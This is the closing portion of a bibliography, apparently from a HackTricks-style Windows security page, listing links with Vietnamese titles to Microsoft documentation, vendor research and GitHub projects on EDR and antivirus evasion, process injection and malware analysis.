- [15] [Microsoft Learn – Thứ tự tìm kiếm thư viện liên kết động](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Bảo mật tiến trình và quyền truy cập](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – Tài liệu tham khảo EKU (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [Trình khởi chạy CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – Đối phó với EDR nhờ Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Phá vỡ lớp bảo vệ của Windows Defender bằng kỹ thuật chuyển hướng thư mục](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Tài liệu tham khảo lệnh mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Sau bức màn thuần khiết: Từ RAT đến builder rồi coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer sắp đến: Một infostealer mới đầy tham vọng](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Giải mã Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Đánh bại malware Node.js bằng API tracing](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Người đẹp ngủ trong rừng: Đưa Adaptix vào trạng thái ngủ bằng Crystal Palace](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Đầu độc tham số tiến trình](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Người đẹp ngủ trong rừng II: CFG, CET và giả mạo stack](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Làm rối giấc ngủ bằng Ekko](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com - Ẩn ETW của Dotnet](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com - Lạm dụng Chrome Remote Desktop trong hoạt động Red Team: Hướng dẫn thực tiễn](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research - BTR Reforged: Biến driver khắc phục sự cố của Defender thành primitive thao tác kernel](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY - BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Mã đi kèm Function Peekaboo của MDSec](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec - Function Peekaboo: Tạo các hàm tự che giấu bằng LLVM](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn - VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT - mã nguồn InjectSetConsole](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn - Hàm CreatePipe](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
- [43] [Microsoft Learn - Tạo tiến trình con với đầu vào và đầu ra được chuyển hướng](https://learn.microsoft.com/en-us/windows/win32/procthread/creating-a-child-process-with-redirected-input-and-output)
- [44] [Praetorian - GhostPack Necromancy: Tái tạo công cụ C# bằng WasmForge](https://praetorian.com/blog/wasmforge-csharp-ghostpack-edr-evasion)
- [45] [WasmForge - Biên dịch dự án C# / .NET](https://github.com/praetorian-inc/wasmforge/blob/main/docs/CSHARP.md)
- [46] [Mã nguồn và proof-of-concept DLLParty](https://github.com/epersic/DLLParty)
- [47] [DLLParty — Lạm dụng nội bộ thread pool để inject DLL không cần shellcode](https://medium.com/@persic.eno/dllparty-abusing-thread-pool-internals-for-shellcodeless-dll-injection-7c84106f7745)
- [48] [Bộ dữ liệu benchmark EMBER2024 và công cụ thrember](https://github.com/FutureComputing4AI/EMBER2024)
- [49] [Dùng EMBER2024 để đánh giá implant của red team](https://mez0.cc/posts/evaluating-implants-with-ember/)
- [50] [MSec Operations – Né tránh các cơ chế phát hiện dựa trên machine learning](https://msecops.de/blog/posts/ml-evasion/)
- [51] [Kaspersky Securelist – Framework nạp .NET dựa trên XAML của NetamLoader](https://securelist.com/netamloader/121676)
- [52] [Microsoft Learn – Liệt kê AMSI_RESULT](https://learn.microsoft.com/en-us/windows/win32/api/amsi/ne-amsi-amsi_result)
- [53] [Microsoft Learn – Phương thức IAntimalware::Scan](https://learn.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-iantimalware-scan)
{{#include ../banners/hacktricks-training.md}}
